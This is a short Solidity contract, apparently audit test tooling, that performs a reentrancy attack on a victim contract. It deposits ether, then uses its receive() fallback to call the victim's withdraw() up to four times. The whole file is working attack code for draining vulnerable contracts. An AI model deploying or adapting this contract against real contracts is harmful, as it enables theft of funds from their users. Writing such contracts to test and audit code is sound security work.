// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import "@openzeppelin/contracts/access/Ownable.sol";

/**
 * @title Reentrancy Attack contract
 * @notice This is reentrancy attack contract to test other contracts for audit.
 */
contract ReentrancyAttack is Ownable{
    address public victim;
    uint256 public contractBalance;
    uint256 public amount;
    uint256 public counter = 0;

    constructor(address _victim) payable {
        victim = _victim;
        amount = msg.value;
    }

    receive() external payable {
        counter++;
        withdrawAttack();
    }

    function payIn() public returns (bool success) {
        (bool success, bytes memory data) = payable(victim).call{value: amount}(abi.encodeWithSignature("payIn()"));
    }

    function withdrawAttack() public {
        if(counter < 4) {
            payable(victim).call(abi.encodeWithSignature("withdraw()"));
        }
    }

    function updateContractBalance() public {
        contractBalance = address(this).balance;
    }
}